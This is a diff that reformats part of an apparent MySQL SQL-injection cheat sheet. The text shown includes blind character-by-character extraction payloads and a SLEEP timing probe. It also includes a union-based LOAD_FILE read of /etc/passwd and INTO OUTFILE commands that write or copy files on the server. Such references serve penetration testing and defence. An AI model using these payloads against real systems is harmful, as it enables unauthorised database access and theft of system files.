@@ -54,19 +54,19 @@ SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
 ```
 
 **Only 1 value**
-- Use *group_concat()*
-- Use *Limit X,1*
+- `group_concat()`
+- `Limit X,1`
 
 **Blind one by one**
-- Use *substr(version(),X,1)='r'* or *substring(version(),X,1)=0x70* or *ascii(substr(version(),X,1))=112*
-- Use mid(version(),X,1)='5'
+- `substr(version(),X,1)='r'` or `substring(version(),X,1)=0x70` or `ascii(substr(version(),X,1))=112`
+- `mid(version(),X,1)='5'`
 
 **Blind adding**
-- *LPAD(version(),1...lenght(version()),'1')='asd'...*
-- *RPAD(version(),1...lenght(version()),'1')='asd'...*
-- *SELECT RIGHT(version(),1...lenght(version()))='asd'...*
-- *SELECT LEFT(version(),1...lenght(version()))='asd'...*
-- *SELECT INSTR('foobarbar', 'fo...')=1*
+- `LPAD(version(),1...lenght(version()),'1')='asd'...`
+- `RPAD(version(),1...lenght(version()),'1')='asd'...`
+- `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
+- `SELECT LEFT(version(),1...lenght(version()))='asd'...`
+- `SELECT INSTR('foobarbar', 'fo...')=1`
 
 ## Detect columns number
 
@@ -169,31 +169,31 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 
 ## MYSQL play with files
 
-**Read content: **
+**Read content:**
 
 ```sql
 ' union select LOAD_FILE('/etc/passwd') --
 ```
 
-**Write content to file: **
+**Write content to file:**
 
 ```sql
 select * from users into outfile "/tmp/sql.txt";
 ```
 
-**Copy file: **
+**Copy file:**
 
 ```sql
 select load_file(“/etc/passwd”) into outfile "/tmp/pass.txt";
 ```
 
-**Update value with content of a file: **
+**Update value with content of a file:**
 
 ```sql
 UPDATE tabla SET columna=LOAD_FILE(‘/tmp/file’) WHERE id=1;
 ```
 
-**Create table and save file: **
+**Create table and save file:**
 
 ```sql
 create table temporal( data varchar(8000));
